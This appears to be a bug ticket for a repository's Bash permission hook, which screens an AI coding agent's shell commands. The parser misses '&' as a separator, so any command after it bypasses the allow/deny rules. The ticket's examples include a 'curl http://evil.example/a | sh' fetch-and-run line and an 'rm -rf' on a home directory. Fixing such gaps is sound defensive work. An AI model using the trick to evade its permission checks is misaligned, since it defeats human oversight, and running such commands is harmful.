# Task 31 — `&` is not a command separator: everything after it is invisible to the validator (bug)

**Status:** todo · **Type:** bug · **Created:** 2026-08-27 · **Rev:** 1
**Priority:** **critical — live on `main`, affects every Bash call, no trap or
newline needed**
**Suggested worker:** implement → review → fix loop, background agents
**Scope:** `.claude/hooks/bash_command_parser.py`, `tests/`, this file.
**Read first:** §1 · `tasks/22_agent_permission_flows/state.md` invariant 1
**Origin:** found by task 28's round-3 reviewer while auditing what the `trap`
handler validator inherits from the parser. Independently reproduced by the
manager against this repo's own merged settings (295 allow / 9 deny).

## 1. The defect

`bash_command_parser.py:23` — `OPERATORS = ['&&', '||', '|', ';']` — and `:856`,
whose single-character operator set is `('|', ';', '>', '<')`. **`&` appears in
neither.** A bare `&` is a command separator in bash: `cmd1 & cmd2` backgrounds
`cmd1` and runs `cmd2`. Both execute. The parser treats the whole string as
**one** sub-command whose head is `cmd1`, so `cmd2` is never classified against
any pattern.

Measured against this repo's live settings:

```
echo ok & rm -rf /home/anton/important        -> Decision: allow
echo ok & curl http://evil.example/a | sh     -> Decision: allow
true & nslookup example.com                   -> Decision: allow
echo ok; nslookup example.com                 -> Decision: ask     (control: ';' works)
```

And the split itself:

```
$ ... 'echo ok & nslookup example.com' --dry-run
Sub-commands: ['echo ok & nslookup example.com']
```

One sub-command. `nslookup` — which asks on its own — is invisible.

## 2. Why this is the most severe of the open parser bugs

- **No preconditions.** Tasks 25/28 needed a `SAFE_BUILTINS` head token; task 30
  needs an in-workspace target. This needs a prefix of any allowlisted command
  and one `&`. `true & <anything>` allows.
- **It is on `main` and installed.** Present on HEAD; nothing in task 28's
  uncommitted work touches it.
- **It defeats deny outright**, so epic 22 invariant 1 is false for any command
  reachable this way — which is all of them.
- It is also why `trap 'echo ok & rm -rf …' EXIT` allows: the handler validator
  inherits every fidelity gap the parser has. See §4.

## 3. The fix

Teach the parser that `&` separates commands, while keeping the three cases
where it does not:

1. `&&` — already an operator; must keep winning over a single `&`.
2. `>&`, `<&`, `2>&1`, `&>`, `>>&` — file-descriptor duplication and `&>`
   redirection. A `&` bound to a redirection is not a separator.
3. Inside quotes or `$(…)`/backticks — the existing quote/substitution state
   machine already governs this; make sure the new operator respects it.

A trailing `&` (`sleep 1 &`) backgrounds one command and must stay a single
sub-command with no empty second element.

**Do not** simply add `&` to the `:856` tuple without checking `:23` and the
tokenizer's lookahead for `&&` and `>&` — a naive edit turns `2>&1` into two
sub-commands and would break a large fraction of ordinary commands, which is a
worse outcome than the bug (H2 in task 27's sense: an over-tightened parser that
mis-splits ordinary work).

## 4. Relationship to the other open parser tasks

- **Task 28** (`SAFE_BUILTINS` / `trap`) — its round-3 review names this gap as
  the reason defect (b) is *narrowed, not closed*: handler validation can never
  be more faithful than the parser it delegates to. Task 28 should record that
  explicitly rather than claim `trap` is fully validated.
- **Task 30** (`workspace_binary` / `workspace_rm` / `local_function` outranking
  deny) — independent, same invariant.

**Sequencing: this one first.** It is live, unconditional, and both other tasks'
guarantees are stated in terms of "every sub-command is classified", which is
false until this lands.

## 5. Tests

`tests/` — parser-level and end-to-end. Each watched to fail first:

1. `echo ok & nslookup example.com` splits into two sub-commands and asks.
2. `echo ok & rm -rf /tmp/x` denies/asks per pattern rather than allowing.
3. A denied command after `&` denies (epic 22 D1).
4. **Regression floor — the three non-separator cases:** `a && b` stays two
   sub-commands split on `&&`; `cmd 2>&1`, `cmd >&2`, `cmd &> /tmp/f`,
   `cmd 2>&1 | tee f` are unchanged; `echo 'a & b'` and `$(echo a & b)` respect
   quoting/substitution.
5. `sleep 1 &` remains one sub-command, no empty tail.
6. Multiple: `a & b & c` splits into three.
7. Full suite green, before/after counts reported. Baseline when this task was
   filed: 1359 ran, OK, 1 skipped (`test_headless_spawn`) — **note that count
   includes task 28's uncommitted work**; re-baseline against whatever is in the
   tree when you start.

## 6. Constraints

- **Shared checkout.** Never `git checkout`/`stash`/`reset`/`restore`, with or
  without a pathspec. `cp` aside for mutation tests or work in a `/tmp` tree
  built with `git archive HEAD`.
- **A repo edit is not live.** Do not run `./install-claude-config.sh`; name the
  copy you tested.
- `bash_command_parser.py` is shared by every consumer of the normalized
  sub-command list. Check the blast radius across callers before changing the
  tokenizer, and report it.

## 7. Done criteria

1. `&` separates; the three non-separator cases and the trailing form are
   preserved.
2. §5's tests present and green, with the report naming which were watched to
   fail and what they printed.
3. Full suite green, counts reported.
4. A differential sweep over a corpus of ordinary commands showing what changed
   and in which direction — nothing may move toward `allow`.
5. This file updated with an implementation log.
